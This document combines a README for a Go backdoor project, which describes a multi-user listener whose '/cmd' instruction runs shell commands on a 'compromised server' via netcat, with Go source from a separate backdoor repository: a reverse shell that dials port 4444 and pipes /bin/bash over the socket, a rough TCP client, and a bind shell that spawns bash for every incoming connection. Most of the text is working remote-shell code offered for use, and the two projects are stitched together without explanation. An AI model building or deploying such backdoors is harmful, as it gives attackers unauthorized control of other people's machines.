
##
#
https://github.com/LukeDSchenk/go-backdoors
#
##

# backdoorGolang

[![Windows Build Status](https://ci.appveyor.com/api/projects/status/github/pilebones/backdoorGolang?svg=true&branch=master&passingText=Windows%20-%20OK&failingText=Windows%20-%20failed&pendingText=Windows%20-%20pending)](https://ci.appveyor.com/project/pilebones/backdoorGolang)
  
Backdoor with Golang (Cross-Plateform)

_/!\ Work in progress, not a stable release /!\_

##Main goal

A fork of my own project named : "pilebones/backdoorBash" (see: https://github.com/pilebones/backdoorBash) but instead of using Bash as programming language (Unix-like only) this new one will work on Windows too by using a Golang API (cross-plateform) developed from scratch (as much as possible).

## Requirements

- Golang SDK : Compiler and tools for the Go programming language from Google (see: https://golang.org/doc/install)

From Arch Linux :
```bash
(sudo) pacman -S community/go
```

From Debian :
```bash
(sudo) apt-get install golang-go
```

## Installation

```bash
cd $GOPATH
go get github.com/pilebones/backdoorGolang
./bin/backdoorGolang --help

```

## Usage

```bash
./bin/backdoorGolang --help
Usage of ./bin/backdoorGolang:
  -d, --debug         Enable mode debug
  -h, --host string   Set hostname to use (default "localhost")
  -l, --listen        Enable listen mode (server socket mode)
  -p, --port int      Set port number to use (default 9876)
  -v, --verbose       Enable mode verbose
  -V, --version       Display version number
```

## Server-mode

```bash
./bin/backdoorGolang -h localhost -p 1234 -l
```

Notice : Server is multi-user capable (one server for X client)

## Client-mode

/!\ Not implemented yet, use netcat meanwhile !

```bash
netcat localhost 1234
```

### Instructions

Each message submit by client is sent to all backdoor's clients like a chat. 
However, an alone chat's feature is useless, there are a set of instructions allowed by all clients which have different behavior for taking advantage of the compromised server.

#### Quit Instruction

This instruction permit to logout the current user

```bash
/quit
/exit
```
Example :
```bash
echo "/quit"|netcat localhost 1234
```

#### Command Instruction

This instruction permit to execute shell command from server. (OS supported : Linux, Windows)

```bash
/cmd <shell-command>
```
Example :
```bash
echo "/cmd ls -l"|netcat localhost 1234




package main

import (
    "fmt"
    "net"
    "os/exec"
    "os"
    //"io"
)

//executes a bash shell and pipes in/out/err over the connection
func createShell(connection net.Conn) {
    var message string = "successful connection from " + connection.LocalAddr().String()
    _, err := connection.Write([]byte(message + "\n"))
    if err != nil {
        fmt.Println("An error occurred trying to write to the outbound connection:", err)
        os.Exit(2)
    }

    cmd := exec.Command("/bin/bash")
    cmd.Stdin = connection
    cmd.Stdout = connection
    cmd.Stderr = connection

    cmd.Run()
}

func main() {
    var tcpPort string = "4444"
    connection, err := net.Dial("tcp", "127.0.0.1:" + tcpPort) //connect to the listener on another machine
    if err != nil {
        fmt.Println("An error occurred trying to connect to the target:", err)
        os.Exit(1)
    }
    fmt.Println("Successfully connected to the target")

    createShell(connection)
    /*for {
        checkConnection(connection)
    }*/
}

//constantly checks that the connection is still alive
/*func checkConnection(connection net.Conn) {
    buffer := make([]byte, 256)
    _,err := connection.Read(buffer)

    if err != nil {
        if err == io.EOF {
            fmt.Println("Connection was closed by remote host")
            connection.Close()
            os.Exit(3)
        } else {
            fmt.Println("An error occurred while checking the connection:", err)
            os.Exit(3)
        }
    }
}*/


package main

/* A simple tcp client. This is nowhere near functional or complete, I am simply keeping it here for now.*/

import (
    "fmt"
    "net"
    "bufio"
    "os"
)

func main() {
    var tcpPort string = "4444"
    connection, err := net.Dial("tcp", "127.0.0.1:" + tcpPort) //connect to the socket
    if err != nil {
        fmt.Println("An error occurred trying to connect to the target:", err)
    }

    for {
        //receive reply from server and print
        message, _ := bufio.NewReader(connection).ReadString('\n') //waits and receives a reply from the server
        //fmt.Print("Message from server: " + message)
        fmt.Print(message)

        //read input from standard in
        reader := bufio.NewReader(os.Stdin)
        //fmt.Print("Text to send: ")
        text, _ := reader.ReadString('\n')

        //write input to tcp socket
        fmt.Fprintf(connection, text + "\n") //formats and writes to a given io.Writer object, in this case the connection
    }
}

/* To make this work more optimally:

   Create a channel to handle all stdout operations (everything to be printed to your terminal).
   Instead of reading one line from your stdin, and then waiting for one line from stdout (from the connection),
   send all stdout to a channel. Have a separate thread which reads from that channel and displays the information
   to the terminal.

   IN A NUTSHELL:
   ---------------------------------
   READING FROM STDIN AND READING FROM STDOUT LIVE WITHIN THEIR OWN GOROUTINES.
   THAT IS WHY A NORMAL TERMINAL OPERATION DOES NOT FREEZE UP YOUR INPUTS WHEN THINGS ARE RUNNING.
   YOU MAY NEED TO IMPLEMENT A LOCK OF SOME SORT SO THAT THE SERVER DOES NOT TRY AND DO MORE THAN ONE OPERATION
   WHILE IT IS ALREADY SENDING DATA.
   HONESTLY, THIS IS KINDA INTERESTING. I DON'T REALLY KNOW IF I AM EVEN SAYING THIS RIGHT. WE WILL FIGURE IT OUT.
   */


package main

import (
    "fmt"
    "net"
    "os/exec"
    //"time"
)

//receives a reference to a connection, spawns a bash shell over the tcp connection
func handleConnection(connection net.Conn) {
    fmt.Printf("received connection from %v\n", connection.RemoteAddr().String()) //RemoteAddr refers to the machine connecting to the listener, while LocalAddr refers to the address/port of the listener itself

    _, err := connection.Write([]byte("connection successful, bash session over tcp initiated\n")) //convert the string to a byte slice and send it over the connection
    if err != nil {
        fmt.Println("Something went wrong trying to write to the connection:", err)
    }

    cmd := exec.Command("/bin/bash")
    cmd.Stdin = connection //connection pointer is dereferenced to retrieve the connection data
    cmd.Stdout = connection
    cmd.Stderr = connection

    cmd.Run()
}

func main() {
    var listenPort string = "4444"
    listener, err := net.Listen("tcp", "localhost:" + listenPort) //starts a listener on tcp port 4444

    if err != nil {
        fmt.Printf("An error occurred while initializing the listener on %v: %v\n", listenPort, err)
    } else {
        fmt.Println("listening on tcp port " + listenPort + "...")
    }

    //By removing this loop, you could have the program mimic netcat and end after one connection completes
    for {
        connection, err := listener.Accept() //waits for and returns the next connection to the listener
        if err != nil {
            fmt.Printf("An error occurred during an attempted connection: %v\n", err)
        }

        go handleConnection(connection) //go handle the connection concurrently in a goroutine
    }
}

/* Something we learned here: Don't use pointers to interfaces, that is not how they are supposed to work. */
